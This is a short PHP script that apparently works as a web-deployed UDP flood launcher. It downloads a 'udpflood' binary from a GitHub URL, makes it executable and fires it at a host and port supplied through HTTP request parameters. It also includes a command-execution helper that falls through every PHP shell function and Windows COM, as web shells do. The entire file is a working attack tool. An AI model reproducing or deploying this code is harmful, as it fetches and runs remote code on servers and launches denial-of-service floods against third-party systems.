<?php

$fname = 'udpflood';
$link = 'https://github.com/Cvar1984/ambatukam/raw/main/udpflood';

function cmd($in, $re = false)
{
    $out = '';
    if ($re) {
        $in = $in . " 2>&1";
    }
    if (function_exists('exec')) {
        @exec($in, $out);
        $out = @join("\n", $out);
    } elseif (function_exists('passthru')) {
        ob_start();
        @passthru($in);
        $out = ob_get_clean();
    } elseif (function_exists('system')) {
        ob_start();
        @system($in);
        $out = ob_get_clean();
    } elseif (function_exists('shell_exec')) {
        $out = shell_exec($in);
    } elseif (function_exists("popen") && function_exists("pclose")) {
        if (is_resource($f = @popen($in, "r"))) {
            $out = "";
            while (!@feof($f)) {
                $out .= fread($f, 1024);
            }
            pclose($f);
        }
    } elseif (function_exists('proc_open')) {
        $pipes = array();
        $process = @proc_open($in . ' 2>&1', array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null);
        $out = @stream_get_contents($pipes[1]);
    } elseif (class_exists('COM')) {
        $alfaWs = new COM('WScript.shell');
        $exec = $alfaWs->exec('cmd.exe /c ' . $in);
        $stdout = $exec->StdOut();
        $out = $stdout->ReadAll();
    }

    return $out;
}
function flood_udp($host, $port, $times, $throtle = 0, $threads = false)
{
    global $fname;

    if (!$threads) {
        $threads = '$(nproc)';
    }

    $command = sprintf('./%s %s %s %s %s %s', $fname, $host, $port, $throtle, $threads, $times);

    return cmd($command);
}
function escape_all($args)
{
    $args = escapeshellarg($args);
    $args = escapeshellcmd($args);
    return $args;
}
try {

if (!file_exists($fname)) {
    $contents = @file_get_contents($link);
    @file_put_contents($fname, $contents);
    @chmod($fname, 0755); // executable
}

if (!(isset($_REQUEST['host']) && isset($_REQUEST['port']))) {
    show_source(basename($_SERVER['PHP_SELF'])); // just in case
    exit;
}

$host = $_REQUEST['host'];
$host = escape_all($host);
$port = $_REQUEST['port'];
$port = escape_all($port);

if (isset($_REQUEST['times'])) {
    $times = $_REQUEST['times'];
} else {
    $times = 10;
}

$times = escape_all($times);
echo '<pre>', flood_udp($host, $port, $times);
} catch(Exception $e) {
    echo $e->getMessage();
}